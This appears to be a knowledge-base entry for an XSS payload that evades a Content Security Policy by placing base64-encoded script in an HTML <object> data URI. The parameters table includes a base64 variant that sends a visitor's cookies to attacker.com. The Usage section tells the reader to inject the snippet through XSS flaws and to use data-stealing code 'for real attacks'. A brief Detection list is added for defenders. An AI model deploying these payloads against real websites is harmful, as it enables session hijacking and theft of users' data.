---
id: ac5cece5-f30b-4be2-8f81-2990085a20f2
type: code
language: html
verified: true
created_at: '2023-04-06T03:56:43.258056+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - csp-bypass
  - xss-payload
  - data-uri
platforms:
  - Web
validated: true
---

# HTML-Object-Data-URI-Script-Injection

## Code

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

## Description

This HTML snippet uses an <object> element with a data URI containing base64-encoded HTML that includes a <script> tag. When injected into a page with a misconfigured CSP (allowing data: for object-src but restricting script-src), the browser decodes and renders the URI as HTML, executing the JavaScript. It's a classic CSP bypass for injecting XSS payloads in contexts where direct <script> tags are blocked.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Base64 Payload | Base64-encoded HTML with script (replace the example alert) | PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL2F0dGFja2VyLmNvbT8nK2RvY3VtZW50LmNvb2tpZTwvc2NyaXB0Pg== (for cookie exfil) |

## Usage

Inject this snippet via reflected/stored XSS or HTML injection vulnerabilities. Ensure the injection point renders HTML. Test in a browser; if successful, the alert(1) will pop. For real attacks, replace the payload with data-stealing or command-execution code. Used in procedures like [[procedures/CSP-Bypass-via-HTML-Object-Data-URI]].

## Detection

- CSP violation reports if partially enforced.
- Browser console logs for object data URI loads.
- Anomalous JavaScript execution or network requests to attacker domains.
- WAF rules blocking base64 patterns in object data attributes.
